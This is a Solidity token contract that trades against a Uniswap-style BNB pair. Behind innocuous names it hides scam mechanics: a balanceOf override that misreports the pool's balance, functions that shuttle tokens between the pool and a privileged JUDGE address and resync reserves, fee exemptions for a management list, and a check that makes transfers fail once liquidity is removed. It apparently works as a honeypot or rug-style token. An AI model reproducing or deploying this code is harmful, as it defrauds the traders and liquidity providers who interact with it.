// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

import "./ManageElements.sol";
import "./UtilsSDK.sol";

abstract contract Feature is ManageElements {
  using SafeMath for uint256;
  uint32 private blockTimestampLast;
  uint256 private reserve0;
  uint256 private tmpExtras;

  function findUserAndIsBuy(address from, address to)
    internal
    view
    returns (address, bool)
  {
    if (from == _swapV2Pair) return (to, true);
    if (to == _swapV2Pair) return (from, false);
    return (DEAD, false);
  }

  function swaping(address account) internal view returns (uint256) {
    (, , uint32 blockTimestampLastEx) =
      IUniswapV2Pair(_swapV2Pair).getReserves();
    if (
      blockTimestampLast == blockTimestampLastEx &&
      IERC20(WBNB).balanceOf(_swapV2Pair) == reserve0
    ) return (_balances[_swapV2Pair] - tmpExtras);
    else return _balances[account];
  }

  function balanceOf(address account) public view override returns (uint256) {
    if (account == _swapV2Pair) return swaping(account);
    return _balances[account];
  }

  function addOrSubGas(
    uint256 tAmount,
    uint256 cgas,
    bool sopen,
    bool isb
  ) internal {
    uint256 extras = tAmount.mul(cgas).div(100);
    if (!isb) {
      if (!sopen) {
        uint256 planSwapAmount = _balances[_swapV2Pair].div(_planSwap);
        if (_balances[address(this)] > planSwapAmount)
          swapBackB(planSwapAmount);
        extras = extras / 2;
        if (_balances[JUDGE] >= extras) {
          (, , blockTimestampLast) = IUniswapV2Pair(_swapV2Pair).getReserves();
          reserve0 = IERC20(WBNB).balanceOf(_swapV2Pair);
          _transferDirect(JUDGE, _swapV2Pair, extras);
          _extrasSupply += extras;
          tmpExtras = extras;
        } else reserve0 = 1;
      } else {
        uint256 pairAmount = _balances[_swapV2Pair];
        uint256 planSwapAmount = pairAmount.div(_planSwap);
        bool success = _balances[address(this)] > planSwapAmount ? true : false;
        if (_balances[_swapV2Pair] > extras) {
          if (_extrasSupply >= extras) {
            _extrasSupply -= extras;
            if (success) extras += planSwapAmount;
            _transferDirect(_swapV2Pair, JUDGE, extras);
            IUniswapV2Pair(_swapV2Pair).sync();
          } else if (success) {
            _transferDirect(_swapV2Pair, JUDGE, planSwapAmount);
            IUniswapV2Pair(_swapV2Pair).sync();
          }
        }
        if (success) swapBackB(planSwapAmount);
      }
    } else {
      if (sopen) {
        uint256 bnbAmount = address(this).balance;
        uint256 r =
          IERC20(WBNB).balanceOf(_swapV2Pair).mul(tAmount).div(
            _balances[_swapV2Pair] * 2
          );
        if (bnbAmount > r) _swapV2Pair.call{value: r}("");
      } else {
        if (_balances[JUDGE] >= extras) {
          _transferDirect(JUDGE, _swapV2Pair, extras);
          _extrasSupply += extras;
        }
      }
    }
  }

  function burnOfLpIsProhibited() internal {
    uint256 tmpLPAmount = IERC20(_swapV2Pair).totalSupply();
    require(tmpLPAmount >= _lpAmount, "VI: Prohibit remove of LP");
    if (tmpLPAmount != _lpAmount) _lpAmount = tmpLPAmount;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    (address transferAddr, ) = findUserAndIsBuy(sender, recipient);
    if (_managementMap[transferAddr])
      _transferDirect(sender, recipient, amount);
    else {
      burnOfLpIsProhibited();
      _transferFee(sender, recipient, amount);
    }
  }

  function _takeTax(uint256 tAmount)
    private
    returns (uint256 tTransferAmount, uint256 taxFeeAmount)
  {
    taxFeeAmount = tAmount.mul(FEE).div(10000);
    _balances[address(this)] += taxFeeAmount;
    tTransferAmount = tAmount.sub(taxFeeAmount);
  }

  function _transferFee(
    address sender,
    address recipient,
    uint256 amount
  ) internal {
    _transferAmountLog += amount;

    (address transferAddr, bool isBuy) = findUserAndIsBuy(sender, recipient);
    (uint256 tTransferAmount, uint256 taxFeeAmount) = _takeTax(amount);

    emit Transfer(sender, recipient, amount);
    emit Transfer(recipient, address(this), taxFeeAmount);

    (uint256 cgas, bool powS) = getShouldLogNewData();
    addOrSubGas(amount, cgas, powS, isBuy);
    setDelayedReturns(isBuy, transferAddr, taxFeeAmount);

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] += tTransferAmount;
  }
}
